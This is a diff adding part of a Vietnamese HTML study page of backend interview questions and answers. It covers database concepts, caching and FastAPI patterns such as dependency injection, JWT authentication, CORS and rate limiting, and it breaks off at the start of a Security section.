+            <li><strong>Optimistic</strong> (version column): Không lock khi đọc, kiểm tra version khi ghi, retry nếu conflict. Dùng khi conflict rate thấp, cần throughput cao.</li>
+          </ul>
+<pre><code class="language-sql">-- Optimistic: chỉ update nếu version chưa đổi
+UPDATE accounts
+SET balance = balance - 100, version = version + 1
+WHERE id = 1 AND version = 5;
+-- 0 rows affected → ai đó đã update trước → retry</code></pre>
+        </div>
+      </div>
+
+      <div class="qa-card db">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q8</span>
+          <span class="q-text">N+1 Query Problem là gì? Cách fix?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p>Thay vì 1 query JOIN, code chạy 1 query lấy N row rồi N query riêng cho từng row → tổng N+1 queries, cực chậm.</p>
+<pre><code class="language-python"># BAD: 1 + 100 queries
+users = db.fetch("SELECT id FROM users LIMIT 100")
+for u in users:
+    orders = db.fetch("SELECT * FROM orders WHERE user_id=$1", u["id"])
+
+# GOOD: 2 queries
+users = db.fetch("SELECT id FROM users LIMIT 100")
+orders = db.fetch(
+    "SELECT * FROM orders WHERE user_id = ANY($1)",
+    [u["id"] for u in users]
+)</code></pre>
+        </div>
+      </div>
+
+      <div class="qa-card db">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q9</span>
+          <span class="q-text">EXPLAIN ANALYZE dùng để làm gì?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p>Hiển thị query execution plan thực tế — DB chọn index nào, join strategy gì, bao nhiêu rows được scan, thời gian thực tế từng bước.</p>
+          <p>Dùng để tìm slow query, phát hiện <strong>Sequential Scan</strong> không mong muốn, kiểm tra index có được dùng không.</p>
+<pre><code class="language-sql">EXPLAIN ANALYZE
+SELECT * FROM orders WHERE user_id = 1 AND created_at > '2026-01-01';
+-- Nếu thấy "Seq Scan" thay vì "Index Scan" → cần tạo/kiểm tra index</code></pre>
+        </div>
+      </div>
+
+      <div class="qa-card db">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q10</span>
+          <span class="q-text">Redis dùng khi nào trong hệ thống backend?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <table>
+            <tr><th>Use case</th><th>Ví dụ cụ thể</th></tr>
+            <tr><td>Cache</td><td>Tỷ giá, config, user profile</td></tr>
+            <tr><td>Session / JWT blacklist</td><td>Logout, token revoke</td></tr>
+            <tr><td>Rate limiting</td><td>100 req/phút per IP</td></tr>
+            <tr><td>Distributed lock</td><td>Chống duplicate payment</td></tr>
+            <tr><td>Pub/Sub</td><td>Realtime notification</td></tr>
+            <tr><td>Sorted Set</td><td>Leaderboard, priority queue</td></tr>
+          </table>
+        </div>
+      </div>
+
+      <div class="qa-card db">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q11</span>
+          <span class="q-text">Cache-Aside vs Write-Through — khác nhau thế nào?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <ul>
+            <li><strong>Cache-Aside (Lazy)</strong>: App đọc cache trước → miss thì đọc DB → set cache. Data chỉ vào cache khi được đọc. Có thể stale trong thời gian TTL.</li>
+            <li><strong>Write-Through</strong>: Mỗi lần ghi DB đồng thời ghi cache luôn. Cache luôn fresh nhưng tăng write latency và ghi cả data ít được đọc.</li>
+          </ul>
+          <p>Thực tế: thường dùng <strong>Cache-Aside + TTL ngắn</strong> cho simplicity.</p>
+        </div>
+      </div>
+
+      <div class="qa-card db">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q12</span>
+          <span class="q-text">Cache Stampede là gì? Cách xử lý?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p>Khi một cache key hết TTL, nhiều request đồng thời hit miss → tất cả cùng lúc query DB → DB quá tải.</p>
+          <p><strong>Giải pháp:</strong> Dùng <strong>distributed lock</strong> (Redis <code>SET NX</code>) — chỉ cho 1 request rebuild cache, các request còn lại chờ hoặc trả về stale data. Hoặc dùng <strong>probabilistic early expiration</strong> — refresh cache trước khi hết hạn.</p>
+        </div>
+      </div>
+
+      <div class="qa-card db">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q13</span>
+          <span class="q-text">Tại sao không dùng FLOAT/DOUBLE để lưu tiền tệ?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p>FLOAT là binary floating point — không biểu diễn chính xác nhiều số thập phân.</p>
+<pre><code class="language-python">>>> 0.1 + 0.2
+0.30000000000000004   # Sai!
+
+from decimal import Decimal
+>>> Decimal("0.1") + Decimal("0.2")
+Decimal('0.3')        # Đúng</code></pre>
+          <p>Dùng <code>NUMERIC(18,4)</code> trong DB và <code>Decimal</code> trong Python. Sai lệch nhỏ nhân hàng triệu giao dịch thành số tiền lớn và không khớp audit.</p>
+        </div>
+      </div>
+
+      <div class="qa-card db">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q14</span>
+          <span class="q-text">Sharding vs Partitioning khác nhau thế nào?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <ul>
+            <li><strong>Partitioning</strong>: Chia bảng lớn thành nhiều partition <strong>trong cùng DB instance</strong>. Transparent với application. Dùng Range (theo ngày) hoặc Hash.</li>
+            <li><strong>Sharding</strong>: Chia data ra <strong>nhiều DB instance</strong> khác nhau (horizontal scaling). Application phải biết shard nào. Phức tạp hơn nhiều, khó cross-shard query/transaction.</li>
+          </ul>
+          <p>Thứ tự ưu tiên: <em>vertical scale → read replica → partitioning → sharding</em>.</p>
+        </div>
+      </div>
+
+      <div class="qa-card db">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q15</span>
+          <span class="q-text">Deadlock là gì? Làm sao tránh?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p>Deadlock xảy ra khi T1 giữ lock A chờ lock B; T2 giữ lock B chờ lock A → cả hai chờ nhau mãi.</p>
+          <p><strong>Tránh:</strong> Luôn acquire lock theo cùng thứ tự (ví dụ: lock account có ID nhỏ hơn trước); giảm thời gian giữ lock; dùng <code>NOWAIT</code> hoặc timeout; DB tự detect và kill một transaction (victim).</p>
+<pre><code class="language-sql">-- Luôn lock theo thứ tự ID tăng dần
+SELECT * FROM accounts WHERE id IN (1, 2) ORDER BY id FOR UPDATE;</code></pre>
+        </div>
+      </div>
+
+      <div class="qa-card db">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q16</span>
+          <span class="q-text">Connection Pool là gì? Tại sao quan trọng?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p>Pool là tập hợp DB connection được tạo sẵn và tái dùng. Tạo TCP connection + TLS + DB auth tốn 100-500ms. Nếu mỗi request tạo connection mới: chậm và vượt giới hạn DB (PostgreSQL mặc định 100 connections).</p>
+<pre><code class="language-python"># Tạo một lần ở startup
+pool = await asyncpg.create_pool(dsn=..., min_size=5, max_size=20)
+
+# Mỗi request mượn từ pool
+async with pool.acquire() as conn:
+    result = await conn.fetch("SELECT ...")</code></pre>
+        </div>
+      </div>
+
+      <div class="qa-card db">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q17</span>
+          <span class="q-text">UUID vs Auto-increment ID — khi nào dùng cái nào?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <ul>
+            <li><strong>Auto-increment</strong>: Đơn giản, nhỏ (8 bytes), sequential → insert nhanh. Nhưng expose thứ tự, không an toàn trong URL, không phù hợp distributed system.</li>
+            <li><strong>UUID v4</strong>: Random, globally unique, an toàn. Nhưng 16 bytes, random → nhiều page split trong B-tree → chậm hơn ở scale lớn.</li>
+            <li><strong>UUID v7</strong> (khuyến nghị): Time-ordered — kết hợp ưu điểm cả hai: sequential insert + globally unique.</li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="qa-card db">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q18</span>
+          <span class="q-text">Immutable Ledger Pattern là gì? Tại sao dùng trong fintech?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p>Thay vì UPDATE balance trực tiếp, mỗi thay đổi tạo một row mới (chỉ INSERT, không UPDATE/DELETE). Balance = tổng tất cả transaction của account.</p>
+          <p><strong>Lý do:</strong> Audit trail đầy đủ, dễ reconcile, rollback tự nhiên (thêm compensating transaction), không mất lịch sử.</p>
+<pre><code class="language-sql">-- Không UPDATE balance. Chỉ INSERT entries:
+INSERT INTO ledger (account_id, type, amount, balance_after)
+VALUES (1, 'DEBIT', 500.00, 4500.00);</code></pre>
+        </div>
+      </div>
+
+      <div class="qa-card db">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q19</span>
+          <span class="q-text">Tại sao cần Idempotency Key trong payment API?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p>Network không đáng tin cậy — client có thể retry khi timeout mà không biết server đã xử lý chưa. Không có idempotency → cùng payment bị xử lý 2 lần (duplicate charge).</p>
+          <p>Idempotency key là unique ID do client tạo, gửi kèm request. Server lưu kết quả theo key — nếu thấy key đã tồn tại, trả về kết quả cũ thay vì xử lý lại.</p>
+<pre><code class="language-text">Client → POST /payments + Idempotency-Key: uuid-abc
+Server: chưa thấy key → xử lý → lưu kết quả
+
+Client retry → POST /payments + Idempotency-Key: uuid-abc
+Server: đã thấy key → trả kết quả cũ, không xử lý lại</code></pre>
+        </div>
+      </div>
+
+      <div class="qa-card db">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q20</span>
+          <span class="q-text">CAP Theorem là gì? Áp dụng thực tế thế nào?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p>Distributed system không thể đồng thời đảm bảo cả 3:</p>
+          <ul>
+            <li><strong>Consistency</strong>: Mọi read đều thấy write mới nhất.</li>
+            <li><strong>Availability</strong>: Mọi request đều nhận được response.</li>
+            <li><strong>Partition Tolerance</strong>: Hệ thống vẫn hoạt động khi network partition.</li>
+          </ul>
+          <p>Vì Partition luôn xảy ra trong thực tế, phải chọn <strong>CP</strong> hoặc <strong>AP</strong>:</p>
+          <ul>
+            <li><strong>CP</strong> (PostgreSQL, HBase): Đảm bảo consistency, có thể từ chối request khi partition. Phù hợp <strong>banking</strong>.</li>
+            <li><strong>AP</strong> (Cassandra, DynamoDB): Luôn available, chấp nhận eventual consistency. Phù hợp social feed, analytics.</li>
+          </ul>
+        </div>
+      </div>
+
+    </div><!-- end .qa-list -->
+  </section>
+
+  <!-- ══════════════════════════════════════════
+       FASTAPI
+  ══════════════════════════════════════════ -->
+  <section id="sec-api" class="section api">
+    <div class="section-header">
+      <div class="section-icon">⚡</div>
+      <div>
+        <h2>FastAPI & Framework</h2>
+        <p>Lifecycle · DI · Middleware · Exception · Auth · WebSocket · Testing</p>
+      </div>
+    </div>
+
+    <div class="progress-bar api"><div class="progress-fill" style="width:100%"></div></div>
+
+    <div class="controls">
+      <button class="ctrl-btn" onclick="expandAll('sec-api')">Mở tất cả</button>
+      <button class="ctrl-btn" onclick="collapseAll('sec-api')">Đóng tất cả</button>
+      <span class="count-label">20 câu hỏi</span>
+    </div>
+
+    <div class="qa-list">
+
+      <div class="qa-card api">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q1</span>
+          <span class="q-text">FastAPI lifespan hoạt động như thế nào? Tại sao không dùng @app.on_event?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p><code>lifespan</code> là async context manager — code trước <code>yield</code> chạy lúc <strong>startup</strong>, sau <code>yield</code> chạy lúc <strong>shutdown</strong>. Dùng để khởi tạo và đóng resource một lần (DB pool, Redis, HTTP client).</p>
+          <p><code>@app.on_event</code> đã <strong>deprecated</strong> từ FastAPI 0.93 — <code>lifespan</code> an toàn hơn vì đảm bảo cleanup luôn chạy dù startup lỗi giữa chừng.</p>
+<pre><code class="language-python">@asynccontextmanager
+async def lifespan(app: FastAPI):
+    app.state.db = await asyncpg.create_pool(dsn=...)  # startup
+    yield
+    await app.state.db.close()                          # shutdown
+
+app = FastAPI(lifespan=lifespan)</code></pre>
+        </div>
+      </div>
+
+      <div class="qa-card api">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q2</span>
+          <span class="q-text">Dependency Injection trong FastAPI là gì? Cách hoạt động?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p>DI cho phép inject dependencies (DB session, current user, config) vào route handler qua <code>Depends()</code>. FastAPI tự resolve dependency graph — nếu nhiều route dùng cùng dependency trong một request, chỉ gọi <strong>một lần</strong> (<code>use_cache=True</code> mặc định). Hỗ trợ sub-dependency lồng nhau.</p>
+<pre><code class="language-python">async def get_db(request: Request):
+    async with request.app.state.db.acquire() as conn:
+        yield conn   # Trả connection về pool sau khi request xong
+
+@app.get("/users/{id}")
+async def get_user(id: int, db=Depends(get_db)):
+    return await db.fetchrow("SELECT * FROM users WHERE id=$1", id)</code></pre>
+        </div>
+      </div>
+
+      <div class="qa-card api">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q3</span>
+          <span class="q-text">Middleware là gì? Thứ tự thực thi thế nào?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p>Middleware là layer bọc quanh toàn bộ request/response pipeline — chạy trước route handler (pre-processing) và sau khi có response (post-processing). Thứ tự thực thi <strong>LIFO</strong> — middleware thêm sau <code>add_middleware()</code> chạy trước (bọc ngoài cùng).</p>
+<pre><code class="language-text">Request  → Middleware C → Middleware B → Middleware A → Route Handler
+Response ← Middleware C ← Middleware B ← Middleware A ←
+(A add_middleware trước, chạy gần handler nhất)</code></pre>
+          <p>Dùng cho: logging, request ID, auth, rate limit, CORS.</p>
+        </div>
+      </div>
+
+      <div class="qa-card api">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q4</span>
+          <span class="q-text">Phân biệt HTTPException, custom exception handler, và RequestValidationError.</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <ul>
+            <li><strong>HTTPException</strong>: raise thủ công trong route, FastAPI tự convert thành JSON với status code chỉ định.</li>
+            <li><strong>Custom exception handler</strong>: <code>@app.exception_handler(MyError)</code> bắt custom exception class, format response theo ý.</li>
+            <li><strong>RequestValidationError</strong>: Pydantic tự raise khi request body/param không valid. Override để format lỗi đồng nhất.</li>
+          </ul>
+<pre><code class="language-python">@app.exception_handler(RequestValidationError)
+async def validation_handler(request, exc):
+    return JSONResponse(status_code=422, content={
+        "error": "VALIDATION_ERROR",
+        "fields": [{"field": e["loc"][-1], "msg": e["msg"]} for e in exc.errors()]
+    })</code></pre>
+        </div>
+      </div>
+
+      <div class="qa-card api">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q5</span>
+          <span class="q-text">Background Tasks là gì? Khi nào dùng Celery thay vì BackgroundTasks?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p><code>BackgroundTasks</code> chạy tác vụ <strong>sau khi response trả về client</strong>, trong cùng process — không cần setup gì thêm.</p>
+          <table>
+            <tr><th></th><th>BackgroundTasks</th><th>Celery</th></tr>
+            <tr><td>App crash</td><td>Task mất</td><td>Task persist</td></tr>
+            <tr><td>Retry tự động</td><td>Không</td><td>Có</td></tr>
+            <tr><td>Monitor</td><td>Không</td><td>Flower</td></tr>
+            <tr><td>Setup</td><td>Zero</td><td>Redis + Worker</td></tr>
+          </table>
+          <p>Dùng Celery khi task cần retry, cần persist qua restart, hoặc chạy lâu (>30s).</p>
+        </div>
+      </div>
+
+      <div class="qa-card api">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q6</span>
+          <span class="q-text">Async route vs sync route — khi nào dùng cái nào?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <ul>
+            <li><strong><code>async def</code></strong>: Dùng khi handler thực hiện I/O async (<code>await</code> DB, <code>await</code> HTTP call). Chạy trong event loop, không block.</li>
+            <li><strong><code>def</code> (sync)</strong>: FastAPI tự chạy trong threadpool để tránh block event loop. Dùng khi gọi thư viện sync không có async version.</li>
+          </ul>
+          <p><strong>Lỗi phổ biến:</strong> Dùng <code>async def</code> nhưng bên trong gọi blocking function (<code>time.sleep</code>, <code>requests.get</code>) → block toàn bộ event loop → throughput giảm nghiêm trọng.</p>
+        </div>
+      </div>
+
+      <div class="qa-card api">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q7</span>
+          <span class="q-text">FastAPI dùng ASGI hay WSGI? Khác nhau thế nào?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p>FastAPI dùng <strong>ASGI</strong> (Asynchronous Server Gateway Interface) — hỗ trợ async/await natively, WebSocket, HTTP/2, long-polling.</p>
+          <p><strong>WSGI</strong> (Flask, Django cũ) là synchronous — mỗi request chiếm một thread, không hỗ trợ WebSocket.</p>
+          <p>FastAPI chạy trên <strong>Uvicorn</strong>. Production dùng: <code>gunicorn -k uvicorn.workers.UvicornWorker</code> — multi-process + async.</p>
+        </div>
+      </div>
+
+      <div class="qa-card api">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q8</span>
+          <span class="q-text">APIRouter dùng để làm gì?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p><code>APIRouter</code> giúp tổ chức route theo module, tránh nhét hết vào <code>main.py</code>. Mỗi router có prefix, tags, dependencies riêng.</p>
+<pre><code class="language-python"># routers/payments.py
+router = APIRouter(prefix="/payments", tags=["payments"],
+                   dependencies=[Depends(require_auth)])
+
+@router.post("/transfer")
+async def transfer(...): ...
+
+# main.py
+app.include_router(payments.router)
+app.include_router(users.router)</code></pre>
+        </div>
+      </div>
+
+      <div class="qa-card api">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q9</span>
+          <span class="q-text">Response Model dùng để làm gì?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p><code>response_model</code> khai báo schema của response — FastAPI tự <strong>filter chỉ trả về các field trong model</strong>, dù handler trả về object có nhiều field hơn.</p>
+          <p>Dùng để: ẩn field nhạy cảm (<code>password_hash</code>), đảm bảo API contract, tự sinh docs đúng schema.</p>
+<pre><code class="language-python">class UserOut(BaseModel):
+    id: int
+    email: str
+    # Không có password_hash → field này bị filter tự động
+
+@app.get("/users/{id}", response_model=UserOut)
+async def get_user(id: int):
+    return await db.fetchrow("SELECT id, email, password_hash FROM users ...")</code></pre>
+        </div>
+      </div>
+
+      <div class="qa-card api">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q10</span>
+          <span class="q-text">Làm sao implement JWT authentication trong FastAPI?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p>Dùng <code>HTTPBearer</code> để extract token từ <code>Authorization: Bearer</code> header, decode + verify JWT, inject user vào route qua <code>Depends</code>.</p>
+<pre><code class="language-python">from fastapi.security import HTTPBearer
+from jose import jwt, JWTError
+
+security = HTTPBearer()
+
+def get_current_user(credentials=Depends(security)):
+    try:
+        payload = jwt.decode(credentials.credentials, SECRET, algorithms=["HS256"])
+        return payload["sub"]
+    except JWTError:
+        raise HTTPException(401, "Invalid token")
+
+@app.get("/me")
+async def me(user_id: str = Depends(get_current_user)):
+    return {"user_id": user_id}</code></pre>
+        </div>
+      </div>
+
+      <div class="qa-card api">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q11</span>
+          <span class="q-text">Làm sao handle CORS trong FastAPI?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p>Dùng <code>CORSMiddleware</code> từ Starlette. Cấu hình <code>allow_origins</code> chặt chẽ trong production — <strong>không dùng <code>"*"</code></strong> cho API có auth.</p>
+<pre><code class="language-python">from fastapi.middleware.cors import CORSMiddleware
+
+app.add_middleware(
+    CORSMiddleware,
+    allow_origins=["https://app.tyme.com"],
+    allow_credentials=True,
+    allow_methods=["GET", "POST"],
+    allow_headers=["Authorization", "Content-Type"],
+)</code></pre>
+        </div>
+      </div>
+
+      <div class="qa-card api">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q12</span>
+          <span class="q-text">Path parameter vs Query parameter vs Request body — khi nào dùng cái nào?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <ul>
+            <li><strong>Path parameter</strong> (<code>/users/{id}</code>): định danh resource — bắt buộc, không thể bỏ qua.</li>
+            <li><strong>Query parameter</strong> (<code>?status=active&page=1</code>): filter, pagination, optional config.</li>
+            <li><strong>Request body</strong> (JSON): data phức tạp, thay đổi state — dùng cho POST/PUT/PATCH. GET <strong>không nên</strong> có body.</li>
+          </ul>
+<pre><code class="language-python">@app.get("/accounts/{account_id}/transactions")
+async def list_txns(
+    account_id: int,               # path — bắt buộc
+    page: int = 1,                 # query — optional
+    from_date: date | None = None  # query — optional
+): ...</code></pre>
+        </div>
+      </div>
+
+      <div class="qa-card api">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q13</span>
+          <span class="q-text">Làm sao test FastAPI endpoint?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p>Dùng <code>TestClient</code> (sync) hoặc <code>AsyncClient</code> của httpx (async). Override dependencies để inject mock/test DB.</p>
+<pre><code class="language-python">from fastapi.testclient import TestClient
+
+app.dependency_overrides[get_db] = lambda: mock_db  # Override DI
+
+client = TestClient(app)
+
+def test_get_user():
+    r = client.get("/users/1",
+                   headers={"Authorization": "Bearer test-token"})
+    assert r.status_code == 200
+    assert r.json()["id"] == 1</code></pre>
+        </div>
+      </div>
+
+      <div class="qa-card api">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q14</span>
+          <span class="q-text">Streaming response là gì? Khi nào dùng?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p><code>StreamingResponse</code> trả về data theo từng chunk mà không cần buffer toàn bộ vào memory. Dùng khi: export file lớn (CSV, PDF), server-sent events, LLM token streaming.</p>
+<pre><code class="language-python">async def generate_csv(db):
+    yield "id,amount,date\n"
+    async for row in db.cursor("SELECT * FROM transactions"):
+        yield f"{row['id']},{row['amount']},{row['created_at']}\n"
+
+@app.get("/export/transactions")
+async def export(db=Depends(get_db)):
+    return StreamingResponse(
+        generate_csv(db), media_type="text/csv",
+        headers={"Content-Disposition": "attachment; filename=txns.csv"}
+    )</code></pre>
+        </div>
+      </div>
+
+      <div class="qa-card api">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q15</span>
+          <span class="q-text">WebSocket trong FastAPI hoạt động thế nào?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p>FastAPI hỗ trợ WebSocket native qua ASGI. Dùng <code>@app.websocket()</code>, gọi <code>await ws.accept()</code> rồi loop nhận/gửi message. Phù hợp: notification realtime, chat, live dashboard.</p>
+<pre><code class="language-python">@app.websocket("/ws/notifications/{user_id}")
+async def notifications(ws: WebSocket, user_id: int):
+    await ws.accept()
+    try:
+        while True:
+            msg = await redis.blpop(f"notif:{user_id}", timeout=30)
+            if msg:
+                await ws.send_json(json.loads(msg[1]))
+    except WebSocketDisconnect:
+        pass   # Client ngắt kết nối</code></pre>
+        </div>
+      </div>
+
+      <div class="qa-card api">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q16</span>
+          <span class="q-text">Làm sao implement rate limiting trong FastAPI?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p>Cách phổ biến: dùng Redis counter với sliding window, implement qua Dependency hoặc Middleware.</p>
+<pre><code class="language-python">async def rate_limit(request: Request, redis=Depends(get_redis)):
+    key = f"rl:{request.client.host}"
+    count = await redis.incr(key)
+    if count == 1:
+        await redis.expire(key, 60)   # 60s window
+    if count > 100:                   # 100 req/phút
+        raise HTTPException(429, "Too many requests")</code></pre>
+          <p>Hoặc dùng thư viện <code>slowapi</code> (wrapper của <code>limits</code> cho FastAPI).</p>
+        </div>
+      </div>
+
+      <div class="qa-card api">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q17</span>
+          <span class="q-text">Làm sao trả về nhiều loại response từ một endpoint?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p>Dùng <code>responses</code> parameter để document nhiều status code. Khi cần trả về schema khác nhau, return <code>JSONResponse</code> trực tiếp thay vì dựa vào <code>response_model</code>.</p>
+<pre><code class="language-python">@app.post("/payments", responses={
+    200: {"model": PaymentSuccess},
+    422: {"model": PaymentError},
+})
+async def create_payment(req: PaymentRequest):
+    try:
+        result = await process(req)
+        return PaymentSuccess(**result)
+    except InsufficientFundsError as e:
+        return JSONResponse(422, content=PaymentError(message=str(e)).dict())</code></pre>
+        </div>
+      </div>
+
+      <div class="qa-card api">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q18</span>
+          <span class="q-text">OpenAPI docs được sinh tự động như thế nào trong FastAPI?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p>FastAPI đọc type hints của route handler, Pydantic models, <code>Field()</code> descriptions, và decorator metadata (<code>summary</code>, <code>tags</code>) → tự sinh OpenAPI 3.x JSON schema → render ra <code>/docs</code> (Swagger UI) và <code>/redoc</code>.</p>
+          <p><strong>Code chính là docs</strong> — không cần viết thủ công.</p>
+<pre><code class="language-python">@app.post("/transfer",
+          summary="Chuyển tiền giữa 2 tài khoản",
+          description="Atomic transfer với idempotency guarantee.",
+          tags=["payments"])
+async def transfer(req: TransferRequest) -> TransferResponse:
+    ...</code></pre>
+        </div>
+      </div>
+
+      <div class="qa-card api">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q19</span>
+          <span class="q-text">Làm sao xử lý file upload trong FastAPI?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p>Dùng <code>UploadFile</code> với <code>multipart/form-data</code>. Với file lớn nên <strong>stream</strong> thay vì đọc toàn bộ vào memory.</p>
+<pre><code class="language-python">from fastapi import UploadFile, File
+
+@app.post("/kyc/documents")
+async def upload_document(file: UploadFile = File(...)):
+    if file.content_type not in ["image/jpeg", "application/pdf"]:
+        raise HTTPException(400, "Chỉ chấp nhận JPEG và PDF")
+
+    # Stream lên S3, không load toàn bộ vào RAM
+    await s3.upload_fileobj(
+        file.file, bucket="kyc-docs",
+        key=f"{uuid4()}/{file.filename}"
+    )
+    return {"filename": file.filename, "status": "uploaded"}</code></pre>
+        </div>
+      </div>
+
+      <div class="qa-card api">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q20</span>
+          <span class="q-text">Làm sao implement health check endpoint đúng cách?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <p>Cần phân biệt 2 loại — Kubernetes dùng cả hai:</p>
+          <ul>
+            <li><strong>Liveness</strong>: App có đang sống không? → K8s restart nếu fail.</li>
+            <li><strong>Readiness</strong>: App có sẵn sàng nhận traffic không? → K8s dừng route traffic nếu fail.</li>
+          </ul>
+<pre><code class="language-python">@app.get("/health/live")
+async def liveness():
+    return {"status": "ok"}   # Trả về → app alive
+
+@app.get("/health/ready")
+async def readiness(db=Depends(get_db), redis=Depends(get_redis)):
+    try:
+        await db.fetchval("SELECT 1")
+        await redis.ping()
+        return {"status": "ready"}
+    except Exception as e:
+        raise HTTPException(503, detail=f"Not ready: {e}")</code></pre>
+        </div>
+      </div>
+
+    </div><!-- end .qa-list -->
+  </section>
+
+  <!-- COMING SOON sections -->
+
+  <!-- ══════════════════════════════════════════
+       SECURITY
+  ══════════════════════════════════════════ -->
+  <section id="sec-sec" class="section sec">
+    <div class="section-header">
+      <div class="section-icon">🔒</div>
+      <div>
+        <h2>Security</h2>
+        <p>JWT · OAuth 2.0 · OWASP · SQL Injection · XSS · CSRF · Rate Limit · Secrets</p>
+      </div>
+    </div>
+
+    <div class="progress-bar sec"><div class="progress-fill" style="width:100%"></div></div>
+
+    <div class="controls">
+      <button class="ctrl-btn" onclick="expandAll('sec-sec')">Mở tất cả</button>
+      <button class="ctrl-btn" onclick="collapseAll('sec-sec')">Đóng tất cả</button>
+      <span class="count-label">20 câu hỏi</span>
+    </div>
+
+    <div class="qa-list">
+
+      <div class="qa-card sec">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q1</span>
+          <span class="q-text">Authentication vs Authorization khác nhau thế nào?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
+          <ul>
+            <li><strong>Authentication (AuthN)</strong>: Xác minh <em>bạn là ai</em> — "Đây có phải John không?" (login, JWT verify).</li>
+            <li><strong>Authorization (AuthZ)</strong>: Xác minh <em>bạn được phép làm gì</em> — "John có quyền xem account 123 không?" (role check, permission).</li>
+          </ul>
+          <p>Thứ tự luôn là: <strong>AuthN trước → AuthZ sau</strong>. Không thể authorize khi chưa biết identity.</p>
+        </div>
+      </div>
+
+      <div class="qa-card sec">
+        <div class="qa-question" onclick="toggle(this)">
+          <span class="q-num">Q2</span>
+          <span class="q-text">JWT là gì? Cấu trúc gồm những phần nào?</span>
+          <span class="qa-chevron">▼</span>
+        </div>
+        <div class="qa-answer">
